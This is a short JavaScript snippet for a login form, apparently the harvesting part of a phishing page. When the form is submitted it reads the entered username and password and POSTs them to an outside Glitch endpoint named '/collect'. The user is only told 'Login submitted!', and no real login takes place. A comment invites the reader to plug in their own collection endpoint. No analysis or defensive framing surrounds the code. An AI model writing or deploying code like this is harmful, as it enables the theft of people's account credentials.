document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Replace with your actual Glitch endpoint!
    const endpoint = 'https://aware-flower-muenster.glitch.me/collect';

    fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    })
    .then(response => {
        document.getElementById('message').textContent = "Login submitted!";
    })
    .catch(error => {
        document.getElementById('message').textContent = "There was an error submitting the login.";
        console.error('Error sending credentials:', error);
    });
});
